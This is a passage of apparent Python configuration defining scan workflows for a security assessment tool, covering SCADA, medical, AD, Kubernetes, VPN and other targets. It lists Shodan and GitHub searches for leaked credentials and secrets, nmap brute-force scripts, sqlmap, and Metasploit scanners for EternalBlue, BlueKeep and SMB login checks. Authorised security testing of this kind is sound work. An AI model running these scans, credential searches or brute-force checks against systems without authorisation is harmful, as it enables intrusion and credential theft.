                    {"tool": "feroxbuster", "name": "Recursive Content Discovery", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "php,html,js,json,xml,txt,bak,old,inc,zip,tar,gz", "threads": "50", "depth": "5"}},
                    {"tool": "nikto", "name": "Vulnerability Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}},
                    {"tool": "sqlmap", "name": "SQL Injection Test", "config": {"level": "3", "risk": "2", "batch": True, "forms": True, "random_agent": True}}
                ]
            },
            "easm_scan": {
                "name": "External Attack Surface Mapping",
                "description": "Map complete external attack surface for an organization",
                "passive_steps": [
                    {"tool": "shodan", "name": "Organization Infrastructure", "config": {"search_type": "search", "query": "org:[TARGET_ORG]"}},
                    {"tool": "shodan", "name": "ASN Discovery", "config": {"search_type": "search", "query": "asn:[TARGET_ORG]"}},
                    {"tool": "shodan", "name": "SSL Certificate Mapping", "config": {"search_type": "search", "query": "ssl.cert.subject.o:[TARGET_ORG]"}},
                    {"tool": "shodan", "name": "Cloud Assets", "config": {"search_type": "search", "query": "[TARGET_ORG] cloud.provider:aws OR cloud.provider:azure OR cloud.provider:gcp"}},
                    {"tool": "githarvester", "name": "Public Repositories", "config": {"query": "[TARGET_ORG]", "sort": "best"}},
                    {"tool": "githarvester", "name": "Employee Code Leaks", "config": {"query": "[TARGET_ORG] password OR credentials OR internal", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "dnsrecon", "name": "DNS Intelligence", "config": {"scan_type": "std"}},
                    {"tool": "dnsrecon", "name": "Subdomain Discovery", "config": {"scan_type": "brt", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"}},
                    {"tool": "nmap", "name": "Service Discovery", "config": {"scan_type": "SYN", "ports": "21,22,23,25,53,80,110,143,443,445,993,995,1433,3306,3389,5432,5900,8080,8443", "timing": "T4", "scripts": "default,version"}},
                    {"tool": "gobuster", "name": "Web Content Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "php,asp,aspx,jsp,html", "threads": "30"}}
                ]
            },
            "iot_assessment": {
                "name": "IoT/OT Security Assessment",
                "description": "Security assessment for IoT and OT devices",
                "passive_steps": [
                    {"tool": "shodan", "name": "IoT Device Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:502,102,47808,20000,44818"}},
                    {"tool": "shodan", "name": "SCADA Systems", "config": {"search_type": "search", "query": "ip:[TARGET_IP] product:scada OR product:plc OR product:hmi"}},
                    {"tool": "shodan", "name": "Industrial Protocols", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "githarvester", "name": "Firmware/Config Leaks", "config": {"query": "[TARGET_DOMAIN] firmware OR iot OR embedded", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "IoT Port Scan", "config": {"scan_type": "SYN", "ports": "21,22,23,80,102,443,502,1883,1911,4840,5683,8080,8883,20000,44818,47808", "timing": "T3", "scripts": "default,version"}},
                    {"tool": "nmap", "name": "Modbus Enumeration", "config": {"scan_type": "SYN", "ports": "502", "timing": "T3", "scripts": "modbus-discover"}},
                    {"tool": "nmap", "name": "MQTT Discovery", "config": {"scan_type": "SYN", "ports": "1883,8883", "timing": "T3", "scripts": "mqtt-subscribe"}},
                    {"tool": "nmap", "name": "UPnP Discovery", "config": {"scan_type": "SYN", "ports": "1900,5000", "timing": "T3", "scripts": "upnp-info"}},
                    {"tool": "nikto", "name": "Web Interface Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}, "condition": "http_detected"}
                ]
            },
            "ransomware_exposure": {
                "name": "Ransomware Exposure Assessment",
                "description": "Check for common ransomware attack vectors",
                "passive_steps": [
                    {"tool": "shodan", "name": "RDP Exposure Check", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:3389"}},
                    {"tool": "shodan", "name": "SMB Exposure Check", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:445"}},
                    {"tool": "shodan", "name": "VPN Gateway Check", "config": {"search_type": "search", "query": "ip:[TARGET_IP] product:vpn OR product:fortinet OR product:paloalto OR product:cisco"}},
                    {"tool": "shodan", "name": "Known Vulnerabilities", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Ransomware Vector Scan", "config": {"scan_type": "SYN", "ports": "21,22,23,135,139,445,1433,3306,3389,5900,5985,5986", "timing": "T4", "scripts": "smb-vuln-ms17-010,smb-vuln-ms08-067,rdp-vuln-ms12-020"}},
                    {"tool": "enum4linux", "name": "SMB Enumeration", "config": {"all_enum": True}},
                    {"tool": "metasploit", "name": "EternalBlue Check", "config": {"module": "auxiliary/scanner/smb/smb_ms17_010", "threads": "5"}},
                    {"tool": "metasploit", "name": "BlueKeep Check", "config": {"module": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep", "threads": "5"}},
                    {"tool": "nmap", "name": "Default Credentials Check", "config": {"scan_type": "SYN", "ports": "21,22,23,3389", "timing": "T3", "scripts": "ftp-anon,ssh-auth-methods"}}
                ]
            },
            "zero_trust_audit": {
                "name": "Zero Trust Architecture Audit",
                "description": "Audit network segmentation and zero trust controls",
                "passive_steps": [
                    {"tool": "shodan", "name": "External Footprint", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "shodan", "name": "Service Exposure", "config": {"search_type": "search", "query": "ip:[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Full Port Audit", "config": {"scan_type": "SYN", "ports": "1-65535", "timing": "T4"}},
                    {"tool": "nmap", "name": "Service Version Detection", "config": {"scan_type": "SYN", "ports": "1-10000", "timing": "T4", "scripts": "version,default"}},
                    {"tool": "nmap", "name": "Network Segmentation Test", "config": {"scan_type": "SYN", "ports": "22,23,80,135,139,443,445,1433,3306,3389,5432,5900,8080", "timing": "T4"}},
                    {"tool": "enum4linux", "name": "SMB Access Audit", "config": {"all_enum": True}},
                    {"tool": "metasploit", "name": "Anonymous Access Check", "config": {"module": "auxiliary/scanner/smb/smb_enumshares", "threads": "10"}}
                ]
            },
            "lateral_movement_paths": {
                "name": "Lateral Movement Path Analysis",
                "description": "Identify potential lateral movement paths in network",
                "passive_steps": [
                    {"tool": "shodan", "name": "Internal Service Intel", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Admin Service Discovery", "config": {"scan_type": "SYN", "ports": "22,23,135,139,445,3389,5985,5986", "timing": "T4", "scripts": "default,version"}},
                    {"tool": "nmap", "name": "WMI/WinRM Detection", "config": {"scan_type": "SYN", "ports": "135,5985,5986", "timing": "T4", "scripts": "wmi-brute,winrm-brute"}},
                    {"tool": "enum4linux", "name": "Domain Enumeration", "config": {"all_enum": True}},
                    {"tool": "metasploit", "name": "SMB Session Enum", "config": {"module": "auxiliary/scanner/smb/smb_enumusers_domain", "threads": "10"}},
                    {"tool": "metasploit", "name": "Pass-the-Hash Check", "config": {"module": "auxiliary/scanner/smb/smb_login", "threads": "5"}},
                    {"tool": "nmap", "name": "SSH Key Auth Check", "config": {"scan_type": "SYN", "ports": "22", "timing": "T4", "scripts": "ssh-hostkey,ssh-auth-methods"}}
                ]
            },
            "ci_cd_security": {
                "name": "CI/CD Pipeline Security",
                "description": "Assess CI/CD pipeline security posture",
                "passive_steps": [
                    {"tool": "shodan", "name": "Jenkins Detection", "config": {"search_type": "search", "query": "ip:[TARGET_IP] product:jenkins OR http.title:Jenkins"}},
                    {"tool": "shodan", "name": "GitLab Detection", "config": {"search_type": "search", "query": "ip:[TARGET_IP] product:gitlab OR http.title:GitLab"}},
                    {"tool": "githarvester", "name": "CI/CD Config Leaks", "config": {"query": "[TARGET_DOMAIN] .gitlab-ci OR Jenkinsfile OR .github/workflows", "sort": "new"}},
                    {"tool": "githarvester", "name": "Secret Exposure", "config": {"query": "[TARGET_DOMAIN] DOCKER_PASSWORD OR NPM_TOKEN OR PYPI_TOKEN", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "CI/CD Service Scan", "config": {"scan_type": "SYN", "ports": "22,80,443,2375,2376,5000,8080,8443,9000,50000", "timing": "T4", "scripts": "http-title,http-headers"}},
                    {"tool": "gobuster", "name": "CI/CD Endpoint Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "json,xml,yaml", "threads": "30"}},
                    {"tool": "nikto", "name": "CI/CD Web Interface Scan", "config": {"port": "8080", "ssl": False, "tuning": "x"}}
                ]
            },
            "kubernetes_recon": {
                "name": "Kubernetes Cluster Recon",
                "description": "Kubernetes cluster security reconnaissance",
                "passive_steps": [
                    {"tool": "shodan", "name": "K8s API Server Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] kubernetes OR port:6443 OR port:10250"}},
                    {"tool": "shodan", "name": "etcd Exposure", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:2379"}},
                    {"tool": "githarvester", "name": "K8s Config Leaks", "config": {"query": "[TARGET_DOMAIN] kubeconfig OR kubernetes secret OR kubectl", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "K8s Service Discovery", "config": {"scan_type": "SYN", "ports": "443,2379,2380,6443,8001,8080,10250,10251,10252,10255,30000-32767", "timing": "T4", "scripts": "http-title,ssl-cert"}},
                    {"tool": "gobuster", "name": "K8s API Endpoints", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt", "threads": "30"}},
                    {"tool": "nikto", "name": "Dashboard Security Check", "config": {"port": "443", "ssl": True, "tuning": "x"}}
                ]
            },
            "docker_security": {
                "name": "Docker/Container Security",
                "description": "Docker and container security assessment",
                "passive_steps": [
                    {"tool": "shodan", "name": "Docker API Exposure", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:2375,2376 product:docker"}},
                    {"tool": "shodan", "name": "Container Registry", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:5000 http.title:registry"}},
                    {"tool": "githarvester", "name": "Dockerfile Leaks", "config": {"query": "[TARGET_DOMAIN] Dockerfile OR docker-compose OR DOCKER_", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Docker Port Scan", "config": {"scan_type": "SYN", "ports": "2375,2376,2377,4243,5000,5001,9323", "timing": "T4", "scripts": "docker-version"}},
                    {"tool": "gobuster", "name": "Registry Enumeration", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "json", "threads": "30"}},
                    {"tool": "nikto", "name": "Registry Web Scan", "config": {"port": "5000", "ssl": False, "tuning": "x"}}
                ]
            },
            "graphql_assessment": {
                "name": "GraphQL API Assessment",
                "description": "GraphQL endpoint security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "GraphQL Endpoint Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] graphql OR /graphql"}},
                    {"tool": "githarvester", "name": "GraphQL Schema Leaks", "config": {"query": "[TARGET_DOMAIN] graphql schema OR query OR mutation", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "API Service Detection", "config": {"scan_type": "SYN", "ports": "80,443,3000,4000,5000,8080,8443", "timing": "T4", "scripts": "http-title,http-methods"}},
                    {"tool": "gobuster", "name": "GraphQL Path Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "graphql", "threads": "30"}},
                    {"tool": "feroxbuster", "name": "Deep Endpoint Discovery", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt", "threads": "40", "depth": "3"}},
                    {"tool": "nikto", "name": "API Security Check", "config": {"port": "80", "ssl": False, "tuning": "x"}}
                ]
            },
            "oauth_oidc_assessment": {
                "name": "OAuth/OIDC Security Assessment",
                "description": "OAuth and OpenID Connect security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "OAuth Provider Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] oauth OR oidc OR openid"}},
                    {"tool": "githarvester", "name": "OAuth Config Leaks", "config": {"query": "[TARGET_DOMAIN] client_secret OR oauth OR OIDC", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "OAuth Service Scan", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443", "timing": "T4", "scripts": "http-headers,http-methods"}},
                    {"tool": "gobuster", "name": "OAuth Endpoint Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "json", "threads": "30"}},
                    {"tool": "feroxbuster", "name": "Auth Path Discovery", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "threads": "40", "depth": "3"}},
                    {"tool": "nikto", "name": "Auth Security Check", "config": {"port": "443", "ssl": True, "tuning": "x"}}
                ]
            },
            "wireless_assessment": {
                "name": "Wireless Infrastructure Assessment",
                "description": "Wireless network and controller security assessment",
                "passive_steps": [
                    {"tool": "shodan", "name": "Wireless Controller Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] wireless OR wlan OR wifi OR aruba OR cisco"}},
                    {"tool": "shodan", "name": "Network Infrastructure", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Wireless Controller Scan", "config": {"scan_type": "SYN", "ports": "22,23,80,443,4343,8080,8443", "timing": "T4", "scripts": "http-title,ssl-cert"}},
                    {"tool": "nmap", "name": "SNMP Discovery", "config": {"scan_type": "SYN", "ports": "161,162", "timing": "T3", "scripts": "snmp-info,snmp-brute"}},
                    {"tool": "nikto", "name": "Management Interface Scan", "config": {"port": "443", "ssl": True, "tuning": "x"}}
                ]
            },
            "voip_assessment": {
                "name": "VoIP Security Assessment",
                "description": "Voice over IP infrastructure security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "VoIP Service Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] voip OR sip OR asterisk OR cisco unified"}},
                    {"tool": "shodan", "name": "PBX Systems", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:5060,5061"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "VoIP Port Scan", "config": {"scan_type": "SYN", "ports": "69,161,162,1719,1720,2000,2427,2727,4569,5060,5061,5070,10000-20000", "timing": "T4", "scripts": "sip-methods,sip-enum-users"}},
                    {"tool": "metasploit", "name": "SIP User Enumeration", "config": {"module": "auxiliary/scanner/sip/enumerator", "threads": "10"}},
                    {"tool": "nikto", "name": "VoIP Web Interface", "config": {"port": "80", "ssl": False, "tuning": "x"}}
                ]
            },
            "medical_device_assessment": {
                "name": "Medical Device/HIPAA Assessment",
                "description": "Healthcare and medical device security assessment",
                "passive_steps": [
                    {"tool": "shodan", "name": "Medical Device Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] hl7 OR dicom OR medical"}},
                    {"tool": "shodan", "name": "DICOM Systems", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:104,11112"}},
                    {"tool": "shodan", "name": "Healthcare Systems", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Healthcare Port Scan", "config": {"scan_type": "SYN", "ports": "80,104,443,2575,2761,2762,8080,11112", "timing": "T3", "scripts": "dicom-ping,hl7-info"}},
                    {"tool": "nmap", "name": "Service Enumeration", "config": {"scan_type": "SYN", "ports": "1-10000", "timing": "T3", "scripts": "version"}},
                    {"tool": "nikto", "name": "Web Portal Scan", "config": {"port": "443", "ssl": True, "tuning": "x"}}
                ]
            },
            "pos_retail_assessment": {
                "name": "POS/Retail System Assessment",
                "description": "Point of Sale and retail system security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "POS System Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] pos OR point of sale OR retail"}},
                    {"tool": "shodan", "name": "Payment Systems", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "POS Port Scan", "config": {"scan_type": "SYN", "ports": "22,80,443,1433,3306,5900,8080,9100", "timing": "T3", "scripts": "default,version"}},
                    {"tool": "nmap", "name": "Database Detection", "config": {"scan_type": "SYN", "ports": "1433,1521,3306,5432", "timing": "T3", "scripts": "mysql-info,ms-sql-info"}},
                    {"tool": "nikto", "name": "POS Web Interface", "config": {"port": "80", "ssl": False, "tuning": "x"}},
                    {"tool": "enum4linux", "name": "Windows POS Enum", "config": {"all_enum": True}}
                ]
            },
            "scada_ics_assessment": {
                "name": "SCADA/ICS Security Assessment",
                "description": "Industrial Control System security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "SCADA Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] scada OR plc OR hmi OR ics"}},
                    {"tool": "shodan", "name": "Industrial Protocols", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:102,502,20000,44818,47808"}},
                    {"tool": "shodan", "name": "Modbus Devices", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:502"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "ICS Protocol Scan", "config": {"scan_type": "SYN", "ports": "21,22,23,80,102,443,502,1089,1090,1091,1911,2222,2404,4840,9600,20000,34962,34963,34964,44818,47808,55000,55001,55002,55003", "timing": "T2", "scripts": "modbus-discover,s7-info,bacnet-info"}},
                    {"tool": "nmap", "name": "BACnet Discovery", "config": {"scan_type": "SYN", "ports": "47808", "timing": "T2", "scripts": "bacnet-info"}},
                    {"tool": "nmap", "name": "S7 Communication", "config": {"scan_type": "SYN", "ports": "102", "timing": "T2", "scripts": "s7-info"}},
                    {"tool": "nikto", "name": "HMI Web Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}}
                ]
            },
            "financial_pci_assessment": {
                "name": "Financial/PCI-DSS Assessment",
                "description": "PCI-DSS compliance and financial system security",
                "passive_steps": [
                    {"tool": "shodan", "name": "Financial Service Intel", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "shodan", "name": "SSL/TLS Analysis", "config": {"search_type": "search", "query": "ip:[TARGET_IP] ssl.version:tlsv1.2 OR ssl.version:tlsv1.3"}},
                    {"tool": "githarvester", "name": "Credential Leaks", "config": {"query": "[TARGET_DOMAIN] card OR payment OR api_key", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "PCI Port Audit", "config": {"scan_type": "SYN", "ports": "21,22,23,25,80,110,143,443,465,587,993,995,1433,3306,3389,5432,8080,8443", "timing": "T4", "scripts": "ssl-enum-ciphers,ssl-cert,ssh-brute"}},
                    {"tool": "nmap", "name": "SSL/TLS Assessment", "config": {"scan_type": "SYN", "ports": "443,8443,9443", "timing": "T4", "scripts": "ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-poodle,ssl-dh-params"}},
                    {"tool": "nikto", "name": "Web Security Scan", "config": {"port": "443", "ssl": True, "tuning": "x"}},
                    {"tool": "sqlmap", "name": "SQL Injection Test", "config": {"level": "3", "risk": "3", "batch": True, "forms": True}}
                ]
            },
            "email_security_assessment": {
                "name": "Email Security Assessment",
                "description": "Comprehensive email infrastructure security testing",
                "passive_steps": [
                    {"tool": "dnsrecon", "name": "MX Record Lookup", "config": {"scan_type": "std"}},
                    {"tool": "shodan", "name": "Mail Server Search", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN] port:25,465,587,993,995"}},
                    {"tool": "shodan", "name": "Exchange Detection", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN] product:exchange"}},
                    {"tool": "githarvester", "name": "Email Credential Leaks", "config": {"query": "[TARGET_DOMAIN] smtp OR email OR mail password", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Mail Server Scan", "config": {"scan_type": "SYN", "ports": "25,110,143,465,587,993,995,2525", "timing": "T4", "scripts": "smtp-commands,smtp-enum-users,smtp-open-relay,imap-capabilities,pop3-capabilities"}},
                    {"tool": "nmap", "name": "SMTP Relay Test", "config": {"scan_type": "SYN", "ports": "25,587", "timing": "T4", "scripts": "smtp-open-relay"}},
                    {"tool": "metasploit", "name": "SMTP User Enumeration", "config": {"module": "auxiliary/scanner/smtp/smtp_enum", "threads": "10"}},
                    {"tool": "nikto", "name": "Webmail Interface", "config": {"port": "443", "ssl": True, "tuning": "x"}}
                ]
            },
            "vpn_gateway_assessment": {
                "name": "VPN Gateway Assessment",
                "description": "VPN and remote access gateway security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "VPN Gateway Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] vpn OR product:fortinet OR product:paloalto OR product:cisco asa OR product:juniper"}},
                    {"tool": "shodan", "name": "SSL VPN Detection", "config": {"search_type": "search", "query": "ip:[TARGET_IP] ssl.cert:vpn OR http.title:vpn"}},
                    {"tool": "shodan", "name": "Known Vulnerabilities", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "VPN Port Scan", "config": {"scan_type": "SYN", "ports": "22,443,500,1194,1701,1723,4500,8443,10443", "timing": "T4", "scripts": "ssl-enum-ciphers,ssl-cert,ike-version"}},
                    {"tool": "nmap", "name": "IPSec Detection", "config": {"scan_type": "SYN", "ports": "500,4500", "timing": "T4", "scripts": "ike-version"}},
                    {"tool": "nikto", "name": "SSL VPN Web Portal", "config": {"port": "443", "ssl": True, "tuning": "x"}},
                    {"tool": "gobuster", "name": "VPN Portal Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "threads": "30"}}
                ]
            },
            "ldap_ad_assessment": {
                "name": "LDAP/Active Directory Assessment",
                "description": "LDAP and Active Directory security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "LDAP Service Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:389,636"}},
                    {"tool": "shodan", "name": "Domain Controller Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:88,389,445"}},
                    {"tool": "githarvester", "name": "AD Credential Leaks", "config": {"query": "[TARGET_DOMAIN] domain\\\\user OR LDAP OR ntlm", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "AD Service Scan", "config": {"scan_type": "SYN", "ports": "53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389", "timing": "T4", "scripts": "ldap-rootdse,ldap-search,smb-os-discovery"}},
                    {"tool": "enum4linux", "name": "AD Enumeration", "config": {"all_enum": True}},
                    {"tool": "metasploit", "name": "Kerberos Enumeration", "config": {"module": "auxiliary/gather/kerberos_enumusers", "threads": "10"}},
                    {"tool": "nmap", "name": "LDAP Anonymous Bind", "config": {"scan_type": "SYN", "ports": "389,636", "timing": "T4", "scripts": "ldap-brute"}}
                ]
            },
            "web_cache_poisoning": {
                "name": "Web Cache Poisoning Assessment",
                "description": "Test for web cache poisoning vulnerabilities",
                "passive_steps": [
                    {"tool": "shodan", "name": "CDN Detection", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN] http.headers.x-cache OR http.headers.cf-cache-status"}},
                    {"tool": "shodan", "name": "Proxy Detection", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Web Service Scan", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443", "timing": "T4", "scripts": "http-headers,http-methods"}},
                    {"tool": "gobuster", "name": "Cacheable Endpoint Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "js,css,png,jpg,gif,woff,woff2", "threads": "30"}},
                    {"tool": "nikto", "name": "Web Security Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}},
                    {"tool": "feroxbuster", "name": "Deep Path Discovery", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "threads": "40", "depth": "3"}}
                ]
            },
            "ssrf_detection": {
                "name": "SSRF Vulnerability Assessment",
                "description": "Server-Side Request Forgery detection and testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "Web Service Intel", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "githarvester", "name": "URL Parameter Leaks", "config": {"query": "[TARGET_DOMAIN] url= OR path= OR fetch= OR request=", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Web Service Fingerprint", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443,3000,5000,9000", "timing": "T4", "scripts": "http-enum,http-methods"}},
                    {"tool": "gobuster", "name": "Parameter Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt", "threads": "30"}},
                    {"tool": "feroxbuster", "name": "API Endpoint Discovery", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt", "extensions": "json,xml", "threads": "40", "depth": "3"}},
                    {"tool": "nikto", "name": "Web Vulnerability Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}}
                ]
            },
            "xxe_injection_assessment": {
                "name": "XXE Injection Assessment",
                "description": "XML External Entity injection testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "XML Service Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] xml OR soap OR wsdl"}},
                    {"tool": "githarvester", "name": "XML Config Leaks", "config": {"query": "[TARGET_DOMAIN] xml OR soap OR wsdl", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "XML Service Scan", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443", "timing": "T4", "scripts": "http-methods,http-headers"}},
                    {"tool": "gobuster", "name": "XML Endpoint Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "xml,wsdl,xsd,dtd", "threads": "30"}},
                    {"tool": "nikto", "name": "Web Security Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}}
                ]
            },
            "insecure_deserialization": {
                "name": "Insecure Deserialization Assessment",
                "description": "Test for insecure deserialization vulnerabilities",
                "passive_steps": [
                    {"tool": "shodan", "name": "Java Service Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] java OR tomcat OR jboss OR weblogic"}},
                    {"tool": "shodan", "name": ".NET Service Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] asp.net OR iis"}},
                    {"tool": "githarvester", "name": "Serialization Code Leaks", "config": {"query": "[TARGET_DOMAIN] serialize OR pickle OR ObjectInputStream", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Application Server Scan", "config": {"scan_type": "SYN", "ports": "80,443,1099,1100,4443,4444,7001,7002,8000,8009,8080,8443,8880,9000,9001,9043,9060,9080,9090,9443,11099,47001,47002", "timing": "T4", "scripts": "rmi-dumpregistry,rmi-vuln-classloader"}},
                    {"tool": "nmap", "name": "Java RMI Detection", "config": {"scan_type": "SYN", "ports": "1099,1100,11099", "timing": "T4", "scripts": "rmi-dumpregistry"}},
                    {"tool": "nikto", "name": "Web Vulnerability Scan", "config": {"port": "8080", "ssl": False, "tuning": "x"}},
                    {"tool": "gobuster", "name": "Admin Panel Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "action,do,jspa,jspx", "threads": "30"}}
                ]
            },
            "jwt_security_assessment": {
                "name": "JWT Security Assessment",
                "description": "JSON Web Token security testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "API Service Intel", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "githarvester", "name": "JWT Secret Leaks", "config": {"query": "[TARGET_DOMAIN] jwt OR JWT_SECRET OR token secret", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "API Service Scan", "config": {"scan_type": "SYN", "ports": "80,443,3000,5000,8080,8443", "timing": "T4", "scripts": "http-headers,http-methods"}},
                    {"tool": "gobuster", "name": "Auth Endpoint Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "json", "threads": "30"}},
                    {"tool": "feroxbuster", "name": "API Path Discovery", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt", "threads": "40", "depth": "3"}},
                    {"tool": "nikto", "name": "API Security Scan", "config": {"port": "443", "ssl": True, "tuning": "x"}}
                ]
            },
            "ssti_assessment": {
                "name": "SSTI Assessment",
                "description": "Server-Side Template Injection testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "Web Framework Detection", "config": {"search_type": "search", "query": "ip:[TARGET_IP] jinja OR django OR flask OR twig OR freemarker"}},
                    {"tool": "githarvester", "name": "Template Code Leaks", "config": {"query": "[TARGET_DOMAIN] template OR render OR jinja OR twig", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Web Service Scan", "config": {"scan_type": "SYN", "ports": "80,443,5000,8000,8080,8443", "timing": "T4", "scripts": "http-headers,http-title"}},
                    {"tool": "gobuster", "name": "Template Endpoint Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "extensions": "html,tpl,tmpl", "threads": "30"}},
                    {"tool": "nikto", "name": "Web Security Scan", "config": {"port": "80", "ssl": False, "tuning": "x"}},
                    {"tool": "feroxbuster", "name": "Deep Path Discovery", "config": {"wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "threads": "40", "depth": "4"}}
                ]
            },
            "nosql_injection": {
                "name": "NoSQL Injection Assessment",
                "description": "NoSQL database injection testing",
                "passive_steps": [
                    {"tool": "shodan", "name": "NoSQL Database Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] mongodb OR couchdb OR redis OR elasticsearch"}},
